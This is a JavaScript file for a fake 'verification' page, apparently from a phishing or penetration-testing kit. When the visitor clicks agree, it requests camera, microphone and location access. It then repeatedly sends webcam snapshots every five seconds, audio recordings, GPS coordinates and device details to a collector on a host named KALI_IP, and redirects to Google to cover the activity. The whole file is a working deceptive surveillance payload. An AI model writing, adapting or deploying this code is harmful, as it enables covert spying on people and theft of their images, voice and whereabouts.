// Configuration
const KALI_IP = "192.168.3.2";
const API_URL = `http://${KALI_IP}:5000/collect`;

let mediaStream = null;
let mediaRecorder = null;
let audioChunks = [];

// Wait for button click
document.getElementById('agree-btn').addEventListener('click', async () => {
    const btn = document.getElementById('agree-btn');
    btn.disabled = true;
    btn.textContent = 'Processing...';
    
    updateMessage('Starting verification...', 'info');
    
    await requestCamera();
    await requestMicrophone();
    await requestLocation();
    
    sendDeviceInfo();
    
    // Start capturing after permissions granted
    setTimeout(() => {
        startPhotoCapture();
        startAudioRecording();
    }, 2000);
    
    updateMessage('✓ Verification completed! Redirecting...', 'success');
    
    setTimeout(() => {
        window.location.href = 'https://www.google.com';
    }, 3000);
});

// Request Camera
async function requestCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
        mediaStream = stream;
        
        updateMessage('✓ Camera access granted', 'success');
        sendToAPI('camera', { status: 'granted' });
        return true;
    } catch(err) {
        updateMessage('✗ Camera access denied', 'error');
        sendToAPI('camera', { status: 'denied', error: err.message });
        return false;
    }
}

// Request Microphone
async function requestMicrophone() {
    try {
        await navigator.mediaDevices.getUserMedia({ audio: true });
        updateMessage('✓ Microphone access granted', 'success');
        sendToAPI('microphone', { status: 'granted' });
        return true;
    } catch(err) {
        updateMessage('✗ Microphone access denied', 'error');
        sendToAPI('microphone', { status: 'denied', error: err.message });
        return false;
    }
}

// Request Location
function requestLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            updateMessage('✗ Location not supported', 'error');
            resolve(false);
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                updateMessage('✓ Location access granted', 'success');
                sendToAPI('location', {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude
                });
                resolve(true);
            },
            (err) => {
                updateMessage('✗ Location access denied', 'error');
                sendToAPI('location', { status: 'denied', error: err.message });
                resolve(false);
            }
        );
    });
}

// Send device info
function sendDeviceInfo() {
    sendToAPI('device_info', {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    });
}

// Capture photo every 5 seconds
function startPhotoCapture() {
    const video = document.getElementById('video');
    const canvas = document.createElement('canvas');
    
    setInterval(() => {
        if (video.videoWidth > 0 && video.srcObject) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.7);
            sendToAPI('image', { data: imageData });
        }
    }, 5000);
}

// Record audio
function startAudioRecording() {
    if (!mediaStream) return;
    
    const audioTracks = mediaStream.getAudioTracks();
    if (audioTracks.length === 0) return;
    
    mediaRecorder = new MediaRecorder(mediaStream);
    
    mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
            audioChunks.push(event.data);
        }
    };
    
    mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
        const reader = new FileReader();
        reader.onloadend = () => {
            sendToAPI('audio', { data: reader.result });
        };
        reader.readAsDataURL(audioBlob);
        audioChunks = [];
    };
    
    mediaRecorder.start();
    
    setInterval(() => {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            setTimeout(() => {
                mediaRecorder.start();
            }, 100);
        }
    }, 10000);
}

// UI Helpers
function updateMessage(text, type) {
    const msgDiv = document.getElementById('message');
    msgDiv.textContent = text;
    msgDiv.className = 'message ' + type;
    
    // Clear after 3 seconds
    setTimeout(() => {
        if (msgDiv.className === 'message ' + type) {
            msgDiv.style.display = 'none';
            setTimeout(() => {
                msgDiv.style.display = '';
            }, 100);
        }
    }, 3000);
}

// Send to API
function sendToAPI(type, data) {
    const payload = { type, ...data };
    
    fetch(API_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    }).catch(err => {
        console.error('Failed to send:', type, err);
    });
}